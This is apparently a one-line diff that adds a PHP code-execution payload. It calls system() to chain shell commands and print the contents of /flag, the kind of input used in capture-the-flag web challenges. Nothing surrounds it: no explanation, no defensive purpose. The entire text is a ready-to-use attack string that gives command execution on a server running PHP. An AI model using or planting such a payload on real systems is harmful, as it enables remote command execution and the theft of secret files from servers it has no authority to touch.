@@ -1,0 +1,1 @@
+<? system('cat ""; cat /flag')/**/?>
